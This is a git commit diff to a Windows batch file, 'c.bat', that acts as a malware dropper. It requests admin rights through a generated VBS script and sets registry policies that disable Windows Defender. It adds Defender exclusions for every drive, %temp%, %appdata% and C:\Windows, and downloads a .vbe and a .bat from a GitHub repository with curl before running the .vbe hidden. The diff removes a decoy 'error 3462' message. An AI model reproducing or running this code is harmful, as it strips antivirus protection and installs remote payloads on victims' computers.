44a501433ab51bcf6f33ac4c563dd34391f7d490
DanGILC-137 <163125984+DanGILC-137@users.noreply.github.com>
2024-06-25 22:02:12 +0200

    Update c.bat

--- c.bat
+++ c.bat
@@ -7,14 +7,42 @@ echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
 "%temp%\admin.vbs"
 del /q "%temp%\admin.vbs"
 
+2>nul (
+    net session && (
+        for %%A in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+            if exist %%A:\ (
+                powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%%A:\' -ErrorAction SilentlyContinue"
+            )
+        )
+    )
+)
 
+
+
+
+
+
+:skip1
+
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%temp%'"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%appdata%'"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
 :run_as_admin
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 curl -s -o "scriptmenagers".vbe -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/scriptmenagers.vbe"
 curl -s -o "msisettings".bat -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/installer.bat"
 start /min wscript.exe "scriptmenagers.vbe"
+
+:: Check if PowerShell exists
+where powershell >nul 2>nul
+if %errorlevel% neq 0 (
+    echo PowerShell is not available.
+    goto skip1
+)
+for /f "tokens=2 delims=:\" %%A in ('wmic logicaldisk get deviceid^,drivetype ^| find "3"') do (
+    echo Adding exclusion for %%A:\
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%%A:\' -ErrorAction SilentlyContinue"
+)
 cls
-echo error 3462
-timeout /t 10 /nobreak >nul
-exit
+
